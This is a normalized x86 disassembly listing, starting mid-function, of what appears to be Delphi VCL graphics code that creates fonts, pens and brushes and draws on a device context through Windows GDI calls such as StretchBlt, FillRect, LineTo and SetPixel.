mov ecx 0x20
call sub_402c04
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_4029f4
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41cb54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c098
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41cba8
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c17c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41cbec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41402c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c8ac
xor eax eax
push ebp
push sub_41cca7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c8ac
xor eax eax
push ebp
push sub_41cc8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c2a4
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cd28
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc91
mov eax [ ebp - 0x8 ]
call sub_41c8bc
retn
mov eax ebx
call sub_41cfac
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41cfc8
sub_41ccd8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c8ac
xor eax eax
push ebp
push sub_41cd1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c22c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd24
mov eax [ ebp - 0x4 ]
call sub_41c8bc
retn
sub_41cd3c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cec5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cecc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403ed8
retn
mov eax [ rw-data ]
call sub_41c080
xor eax eax
push ebp
push sub_41ce9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c08c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404118
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408468
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404118
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408468
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404118
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407b10
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41d020
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41cee4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41caa0
mov edx esp
mov eax ebx
call sub_41ccd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41cf10
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41ccc0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41ccd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41cf50
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41ccc0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b04
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404150
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_4029f4
mov edx esp
mov eax ebx
call sub_41ccd8
sub_41cfc8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41cf10
pop esi
pop ebx
retn
sub_41cff4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41ccc0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41ccd8
add esp 0x30
pop ebx
retn
sub_41d028
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41ccc0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41ccd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41d058
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41ccc0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41ccd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41d080
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c098
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41d0c4
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c17c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41d0ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41402c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c8ac
xor eax eax
push ebp
push sub_41d18b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c8ac
xor eax eax
push ebp
push sub_41d16e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c2a4
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d2d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d175
mov eax [ ebp - 0x8 ]
call sub_41c8bc
retn
sub_41d1a4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d1bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c8ac
xor eax eax
push ebp
push sub_41d201
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c22c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d208
mov eax [ ebp - 0x4 ]
call sub_41c8bc
retn
sub_41d214
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d1a4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d1bc
add esp 0x10
pop esi
pop ebx
retn
sub_41d23c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c080
xor eax eax
push ebp
push sub_41d2c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c08c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c868
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d2f0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d1a4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41d1bc
add esp 0x10
pop esi
pop ebx
retn
sub_41d320
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d1a4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41d1bc
sub_41d34c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c098
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41d38c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c17c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41d3b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41402c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c8ac
xor eax eax
push ebp
push sub_41d444
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c8ac
xor eax eax
push ebp
push sub_41d427
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c2a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d42e
mov eax [ ebp - 0x8 ]
call sub_41c8bc
retn
sub_41d45c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41d478
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c8ac
xor eax eax
push ebp
push sub_41d4bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c22c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4c4
mov eax [ ebp - 0x4 ]
call sub_41c8bc
retn
sub_41d4c8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41d478
add esp 0x10
pop edi
pop esi
retn
sub_41d4f4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d45c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41d478
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41d528
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c080
xor edx edx
push ebp
push sub_41d5f5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c08c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c868
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41d610
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d45c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41d478
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41d644
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41de04
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d080
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41de24
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d34c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41de44
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413d6c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41d708
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413e08
xor edx edx
mov eax esi
call sub_41dc3c
mov eax [ esi + 0xc ]
call sub_4030f8
mov eax [ esi + 0x10 ]
call sub_4030f8
mov eax [ esi + 0x14 ]
call sub_4030f8
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414000
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41d764
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41dc90
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d7ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
mov eax [ ebx + 0x14 ]
call sub_41d4ec
call sub_41c868
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c868
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4125c0
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d898
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
mov eax [ ebx + 0x14 ]
call sub_41d528
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d8d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
mov eax [ ebx + 0x14 ]
call sub_41d528
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d910
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d970
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d99c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d9d8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404174
push eax
mov eax edi
call sub_404374
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41da1c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d9d8
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41da38
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d9d8
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41da58
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41daa4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41daab
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d948
sub_41db04
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41db28
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d970
pop ecx
pop edx
pop edi
pop esi
retn
sub_41db48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41db74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc90
mov eax [ ebp + 0x8 ]
call sub_41c868
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41dbdc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41dc3c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41dbdc
mov edx esp
mov eax ebx
call sub_41db04
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41db28
sub_41dc90
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41dd2c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
test bl 0x8
je r-xdata
mov eax esi
call sub_41dd58
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41dd88
sub_41dd2c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41cd3c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c868
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41dd58
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d23c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41dd88
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41d528
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41d528
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41d608
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41d4ec
call sub_41c868
not eax
push eax
